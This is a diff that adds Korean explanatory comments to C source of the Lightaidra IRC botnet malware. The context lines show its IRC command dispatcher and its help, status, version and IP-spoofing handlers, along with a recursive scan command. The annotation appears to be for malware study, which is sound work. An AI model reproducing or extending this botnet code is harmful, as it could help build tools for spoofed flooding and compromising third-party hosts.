@@ -69,7 +69,7 @@ int pub_requests(sock_t *sp, requests_t *req) {
         } // rcv_b가 "433"과 같으면, getrstr을 호출해 data_ptr을 반환한 후, 소켓번호 sockfd를 이용해 data_ptr을 전송한다. 실패시엔 EXIT_FAILURE를 반환한다
         else if (! strncmp(req->rcv_b, "001", strlen(req->rcv_b))) {
             if (cmd_init(sp) == false) return EXIT_FAILURE;
-        } 
+        }  // 채널에 연결되었는지 연결 여부를 확인하고 결과값을 반환
         else if (! strncmp(req->rcv_b, "332", strlen(req->rcv_b))) {
             if (max_pids == 0 &&  stop == 0) {
                 if (!twordcmp(":.advscan->recursive", req)) {
@@ -225,7 +225,7 @@ void cmd_help(sock_t *sp) {
     sockwrite(sp->sockfd, "PRIVMSG %s :* *** EOF\n", channel);
 
     return;
-}
+} // help 명령어 사용시 출력
 
 void sigkill() {
     exit(EXIT_SUCCESS);
@@ -238,7 +238,7 @@ int cmd_init(sock_t *sp) {
         return EXIT_FAILURE;
 
     return EXIT_SUCCESS;
-}
+} // irc 봇이 연결
 
 /* cmd_ping(sock_t *) */ 
 /* reply PING with PONG. */ 
@@ -309,7 +309,7 @@ void cmd_exec(sock_t *sp, requests_t *req, char *token) {
 void cmd_version(sock_t *sp) {
     sockwrite(sp->sockfd, "PRIVMSG %s :[version] lightaidra 0x2012.\n", channel);
     return;
-}
+} // 현재 악성코드의 버전 출력
 
 /* cmd_status(sock_t * sp) */
 /* show the current status */
@@ -318,7 +318,7 @@ void cmd_status(sock_t *sp) {
     else sockwrite(sp->sockfd, "PRIVMSG %s :[status] working on %s\n", channel, status_temp);
     
     return;
-}
+} // 현재 악성코드의 연결 상태여부를 출력
 
 /* cmd_spoof(sock_t *, requests_t *) */
 /* set an address for ip spoofing */
@@ -329,12 +329,12 @@ void cmd_spoof(sock_t *sp, requests_t *req) {
         srchost = 0;
         sockwrite(sp->sockfd, "PRIVMSG %s :[spoof] spoofing set as random ip!\n", channel);
         return;
-    }
+    } // ip의 값이 성공적으로 무작위 값으로 변경되었는지 확인.
     
     if (strlen(req->rcv_sb) < 7 || strlen(req->rcv_sb) > 15) {  
         sockwrite(sp->sockfd, "PRIVMSG %s :[error] one error in your input data, see help!\n", channel);
         return;
-    } 
+    } // 올바르지 않은 명령어 입력을 확인할 수 있음
     else {
         srchost = (unsigned int)host2ip(req->rcv_sb);
         sockwrite(sp->sockfd, "PRIVMSG %s :[spoof] spoofing set as ip: %s\n", channel, req->rcv_sb);
